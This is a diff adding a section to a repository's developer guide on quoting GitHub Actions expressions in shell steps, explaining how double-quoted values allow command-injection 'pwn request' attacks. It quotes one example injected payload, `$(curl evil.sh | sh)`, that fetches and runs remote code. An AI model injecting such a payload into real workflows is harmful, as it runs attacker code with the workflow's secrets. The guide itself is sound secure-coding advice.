@@ -33,6 +33,7 @@
     - [Markdown](#markdown)
   - [File Modification](#file-modification)
   - [CI / GitHub Actions](#ci--github-actions)
+    - [Quoting GitHub Actions Expressions in Shell Steps](#quoting-github-actions-expressions-in-shell-steps)
   - [Build Configuration, TFMs, RIDs, and Preprocessor Symbols](#build-configuration-tfms-rids-and-preprocessor-symbols)
 
 <!-- /TOC -->
@@ -546,6 +547,33 @@ When adding a new project, register it in `.github/workflows/CI.yaml`:
 | `PACKAGE_PROJECTS`   | Projects to pack as NuGet packages    |
 
 Also add the project to the `.slnx` solution file under the appropriate folder.
+
+### Quoting GitHub Actions Expressions in Shell Steps
+
+GitHub substitutes a `${{ ... }}` expression as literal text **before** the shell parses the line — the shell never
+sees the expression syntax itself, only whatever string came out of it. This makes the quoting around it a real
+security boundary, not a style choice:
+
+- **Single-quote `'${{ ... }}'` by default** in `run:` shell blocks. Single quotes make the substituted text fully
+  literal to bash, whatever it contains.
+- **Double-quoting `"${{ ... }}"` is a code-injection risk.** Bash still evaluates `$()`/backtick command
+  substitution inside double quotes, so if the substituted value ever contains one (`$(curl evil.sh | sh)`), it
+  executes. This is the "pwn request" pattern: an expression whose value an attacker can influence through untrusted
+  input (a fork PR's `github.head_ref`, a PR or issue title, a commit message) becomes a way to run arbitrary code in
+  the workflow's context. Most `${{ }}` values in this codebase are not attacker-influenced (`github.repository`,
+  `secrets.*`, computed job outputs), but the single-quote default costs nothing on those and removes the need to
+  reason about it case by case.
+- **Exception: concatenation with a live shell variable or string** (e.g.
+  `preprocessor_symbols="$preprocessor_symbols;${{ inputs.dispatch-preprocessor-symbols }}"`). The whole expression
+  cannot be single-quoted without losing `$preprocessor_symbols`'s expansion. Document why the exception applies at
+  the call site (see the top-level rule in this document about documenting deviations), and prefer capturing the
+  `${{ }}` value into its own single-quoted variable first when that keeps the risk narrower than an inline
+  concatenation.
+- **A `${{ }}` value already inside another language's quoting context follows that language's syntax, not this
+  rule.** For example, a `jq` filter passed as `--jq 'map(select(.headRefName == "${{ github.ref_name }}")) | ...'`
+  needs double quotes around the expression because `jq` string literals require them — `jq` has no single-quoted
+  string syntax. The outer single quotes around the whole `--jq '...'` argument already make it literal to bash;
+  changing the inner quotes would break `jq`'s own parsing without improving security.
 
 ## Build Configuration, TFMs, RIDs, and Preprocessor Symbols
 
